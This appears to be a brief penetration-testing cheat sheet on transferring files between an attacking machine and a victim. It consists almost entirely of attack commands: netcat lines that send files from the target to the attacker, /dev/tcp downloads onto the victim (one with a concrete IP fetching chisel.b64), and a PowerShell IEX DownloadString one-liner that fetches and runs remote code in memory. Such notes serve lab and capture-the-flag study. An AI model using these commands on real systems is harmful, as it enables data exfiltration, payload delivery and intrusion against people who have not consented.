
## NC 
You can transfer files via netcat using setting up a listener on the box you want to receive the file like so;
`nc -lvnp 9001 > <FILE>`

On the system you want to extract files from, you can 
`nc <ATTACKING MACHINE 9001 < <FILE>`
or
`cat <file> | nc <ATTACKING MACHINE> 9001`


**You may need to terminate the nc listener receiving the file as it can hang and keep the connection active** 


## TCG you monster (/dev/tcp)
You can use `/dev/tcp` to transfer files in some janky horrid way
Host the file on your attack box like normal `nc -lvnp 9001 < <FILE>`

From the victim run 
`cat < /dev/tcp/<IP>/<PORT> > <FILENAME>`

`cat < /dev/tcp/10.11.41.83/9001 > chisel.b64`


## Powershell
Within a powershell cli, you can transfer files to your box with 
`Invoke-WebRequest "http://<IP>/<FILE>" -OutFile "<FILENAME>"`


`powershell.exe -c "IEX(New-Object 	Net.WebClient).DownloadString('http://<IP>/<FILE>')`